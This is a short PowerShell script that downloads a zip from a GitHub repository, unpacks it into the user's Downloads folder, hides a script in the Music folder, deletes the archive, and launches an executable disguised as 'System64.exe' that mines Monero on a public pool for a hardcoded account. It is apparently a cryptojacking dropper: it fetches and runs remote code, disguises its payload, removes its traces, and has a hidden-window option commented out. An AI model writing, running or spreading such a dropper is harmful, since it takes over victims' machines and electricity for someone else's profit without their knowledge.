﻿$download = (New-Object Net.WebClient).DownloadFile('https://github.com/XMRSystem/ETH/raw/master/System.zip',"C:\Users\$env:USERNAME\Downloads\System.Zip")

Add-Type -Assembly 'system.io.compression.filesystem'
[System.IO.Compression.ZipFile]::ExtractToDirectory("C:\Users\$env:USERNAME\Downloads\System.zip","C:\Users\$env:USERNAME\Downloads\System\")


Move-Item -Path "C:\Users\$env:USERNAME\Downloads\System\XMRSystem.ps1" -Destination "c:\Users\$env:USERNAME\Music"
Remove-Item -Path "C:\Users\$env:USERNAME\Downloads\System.Zip"

$ethPAth = "C:\Users\$env:USERNAME\Downloads\System\System64.exe"

$ArgumentList = "-o stratum+tcp://xmr.pool.minergate.com:45560 -u xmrsystem@gmail.com -p x"

Start-Process $ethPAth -ArgumentList $ArgumentList #-WindowStyle Hidden
